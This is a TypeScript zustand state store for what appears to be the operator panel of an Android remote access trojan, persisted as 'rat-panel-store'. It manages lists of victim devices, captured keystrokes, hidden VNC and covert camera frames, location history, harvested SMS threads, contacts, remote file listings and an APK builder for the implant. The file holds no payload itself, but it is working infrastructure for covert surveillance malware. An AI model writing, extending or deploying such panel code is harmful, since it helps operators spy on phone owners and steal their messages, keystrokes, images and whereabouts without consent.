import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import type {
  Device, KeylogEntry, NotifToast, HvncState,
  AuthState, ApkBuildStatus, ViewMode,
  DeviceLocationState, LocationPoint, CameraState,
  SmsThread, Contact, FileEntry,
} from '../types';
import type { ConnState } from '../services/wsService';

type Section =
  | 'devices' | 'hvnc' | 'control' | 'keylogger'
  | 'files' | 'camera' | 'sms' | 'contacts' | 'location'
  | 'apk' | 'settings';

const MAX_LOCATION_HISTORY = 500;
const MAX_KEYLOGS          = 5000;

interface Store {
  /* ── Auth ─────────────────────────────────────────────────── */
  auth:    AuthState;
  setAuth: (a: AuthState) => void;
  logout:  () => void;

  /* ── Devices ──────────────────────────────────────────────── */
  devices:          Device[];
  selectedDeviceId: string | null;
  setDevices:       (d: Device[]) => void;
  upsertDevice:     (d: Device) => void;
  removeDevice:     (id: string) => void;
  selectDevice:     (id: string | null) => void;
  selectedDevice:   () => Device | null;

  /* ── Navigation ───────────────────────────────────────────── */
  activeSection: Section;
  setSection:    (s: Section) => void;

  /* ── View mode ────────────────────────────────────────────── */
  viewMode:    ViewMode;
  setViewMode: (m: ViewMode) => void;

  /* ── HVNC ─────────────────────────────────────────────────── */
  hvnc:         HvncState;
  setHvnc:      (p: Partial<HvncState>) => void;
  hvncFrame:    Uint8Array<ArrayBuffer> | null;
  setHvncFrame: (d: Uint8Array<ArrayBuffer>) => void;

  /* ── Camera ───────────────────────────────────────────────── */
  camera:          CameraState;
  setCamera:       (p: Partial<CameraState>) => void;
  cameraFrame:     Uint8Array<ArrayBuffer> | null;
  setCameraFrame:  (d: Uint8Array<ArrayBuffer>) => void;

  /* ── Location ─────────────────────────────────────────────── */
  locations:        Map<string, DeviceLocationState>;
  addLocation:      (pt: LocationPoint) => void;
  setFollowing:     (deviceId: string, v: boolean) => void;
  clearLocation:    (deviceId: string) => void;

  /* ── Keylogger ────────────────────────────────────────────── */
  keylogs:     KeylogEntry[];
  addKeylog:   (e: KeylogEntry) => void;
  clearKeylogs:(deviceId?: string) => void;

  /* ── SMS ──────────────────────────────────────────────────── */
  smsThreads:    Map<string, SmsThread[]>;   // deviceId → threads
  setSmsThreads: (deviceId: string, threads: SmsThread[]) => void;

  /* ── Contacts ─────────────────────────────────────────────── */
  contacts:    Map<string, Contact[]>;
  setContacts: (deviceId: string, contacts: Contact[]) => void;

  /* ── Files ────────────────────────────────────────────────── */
  fileListings: Map<string, FileEntry[]>;   // `${deviceId}:${path}` → entries
  setFileListing:(deviceId: string, path: string, files: FileEntry[]) => void;

  /* ── APK builder ──────────────────────────────────────────── */
  buildStatus:    ApkBuildStatus | null;
  setBuildStatus: (s: ApkBuildStatus | null) => void;

  /* ── Toasts ───────────────────────────────────────────────── */
  toasts:      NotifToast[];
  addToast:    (t: Omit<NotifToast, 'id'>) => void;
  removeToast: (id: string) => void;

  /* ── Connection ───────────────────────────────────────────── */
  wsConnected:    boolean;
  connState:      ConnState;
  serverPing:     number;
  setWsConnected: (v: boolean)   => void;
  setConnState:   (s: ConnState) => void;
  setServerPing:  (ms: number)   => void;
}

const EMPTY_HVNC: HvncState = {
  active: false, mode: 'silent', quality: 75,
  fps: 0, frameCount: 0, bytesSent: 0, latencyMs: 0,
};

const EMPTY_CAMERA: CameraState = {
  active: false, facing: 'back', width: 0, height: 0, fps: 0, frameCount: 0,
};

export const useStore = create<Store>()(
  persist(
    (set, get) => ({
      /* ── auth ─────────────────────────────────────────────── */
      auth:    { authenticated: false, token: null },
      setAuth: (auth) => set({ auth }),
      logout:  () => set({
        auth:             { authenticated: false, token: null },
        selectedDeviceId: null,
        devices:          [],
        keylogs:          [],
        buildStatus:      null,
        hvncFrame:        null,
        cameraFrame:      null,
        hvnc:             { ...EMPTY_HVNC },
        camera:           { ...EMPTY_CAMERA },
        smsThreads:       new Map(),
        contacts:         new Map(),
        fileListings:     new Map(),
        locations:        new Map(),
      }),

      /* ── devices ──────────────────────────────────────────── */
      devices:          [],
      selectedDeviceId: null,
      setDevices:   (devices) => set({ devices }),
      upsertDevice: (device) =>
        set((s) => {
          const idx = s.devices.findIndex((d) => d.id === device.id);
          if (idx === -1) return { devices: [...s.devices, device] };
          const next = [...s.devices];
          next[idx] = { ...next[idx], ...device };
          return { devices: next };
        }),
      removeDevice: (id) =>
        set((s) => ({ devices: s.devices.filter((d) => d.id !== id) })),
      selectDevice: (id) => set({ selectedDeviceId: id }),
      selectedDevice: () => {
        const { devices, selectedDeviceId } = get();
        return devices.find((d) => d.id === selectedDeviceId) ?? null;
      },

      /* ── navigation ───────────────────────────────────────── */
      activeSection: 'devices',
      setSection:    (activeSection) => set({ activeSection }),

      /* ── view mode ────────────────────────────────────────── */
      viewMode:    'android',
      setViewMode: (viewMode) => set({ viewMode }),

      /* ── hvnc ─────────────────────────────────────────────── */
      hvnc:         { ...EMPTY_HVNC },
      setHvnc:      (p) => set((s) => ({ hvnc: { ...s.hvnc, ...p } })),
      hvncFrame:    null,
      setHvncFrame: (hvncFrame) => set({ hvncFrame }),

      /* ── camera ───────────────────────────────────────────── */
      camera:         { ...EMPTY_CAMERA },
      setCamera:      (p) => set((s) => ({ camera: { ...s.camera, ...p } })),
      cameraFrame:    null,
      setCameraFrame: (cameraFrame) => set({ cameraFrame }),

      /* ── location ─────────────────────────────────────────── */
      locations:    new Map(),
      addLocation:  (pt) =>
        set((s) => {
          const map  = new Map(s.locations);
          const prev = map.get(pt.deviceId);
          const history = prev?.history ?? [];
          const updated: DeviceLocationState = {
            deviceId:  pt.deviceId,
            current:   pt,
            history:   [...history, pt].slice(-MAX_LOCATION_HISTORY),
            following: prev?.following ?? true,
          };
          map.set(pt.deviceId, updated);
          return { locations: map };
        }),
      setFollowing: (deviceId, v) =>
        set((s) => {
          const map = new Map(s.locations);
          const cur = map.get(deviceId);
          if (cur) map.set(deviceId, { ...cur, following: v });
          return { locations: map };
        }),
      clearLocation: (deviceId) =>
        set((s) => {
          const map = new Map(s.locations);
          map.delete(deviceId);
          return { locations: map };
        }),

      /* ── keylogger ────────────────────────────────────────── */
      keylogs:  [],
      addKeylog: (entry) =>
        set((s) => ({ keylogs: [entry, ...s.keylogs].slice(0, MAX_KEYLOGS) })),
      clearKeylogs: (deviceId) =>
        set((s) => ({
          keylogs: deviceId
            ? s.keylogs.filter((k) => k.deviceId !== deviceId)
            : [],
        })),

      /* ── sms ──────────────────────────────────────────────── */
      smsThreads:    new Map(),
      setSmsThreads: (deviceId, threads) =>
        set((s) => {
          const m = new Map(s.smsThreads);
          m.set(deviceId, threads);
          return { smsThreads: m };
        }),

      /* ── contacts ─────────────────────────────────────────── */
      contacts:    new Map(),
      setContacts: (deviceId, contacts) =>
        set((s) => {
          const m = new Map(s.contacts);
          m.set(deviceId, contacts);
          return { contacts: m };
        }),

      /* ── files ────────────────────────────────────────────── */
      fileListings:  new Map(),
      setFileListing: (deviceId, path, files) =>
        set((s) => {
          const m = new Map(s.fileListings);
          m.set(`${deviceId}:${path}`, files);
          return { fileListings: m };
        }),

      /* ── apk builder ──────────────────────────────────────── */
      buildStatus:    null,
      setBuildStatus: (buildStatus) => set({ buildStatus }),

      /* ── toasts ───────────────────────────────────────────── */
      toasts: [],
      addToast: (t) =>
        set((s) => ({
          toasts: [...s.toasts, {
            ...t,
            id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
          }],
        })),
      removeToast: (id) =>
        set((s) => ({ toasts: s.toasts.filter((t) => t.id !== id) })),

      /* ── connection ───────────────────────────────────────── */
      wsConnected:    false,
      connState:      'idle',
      serverPing:     0,
      setWsConnected: (wsConnected) => set({ wsConnected }),
      setConnState:   (connState)   => set({ connState }),
      setServerPing:  (serverPing)  => set({ serverPing }),
    }),
    {
      name: 'rat-panel-store',
      // Only persist auth + preferences — never persist Maps (not serializable)
      partialize: (s) => ({ auth: s.auth, viewMode: s.viewMode }),
    }
  )
);
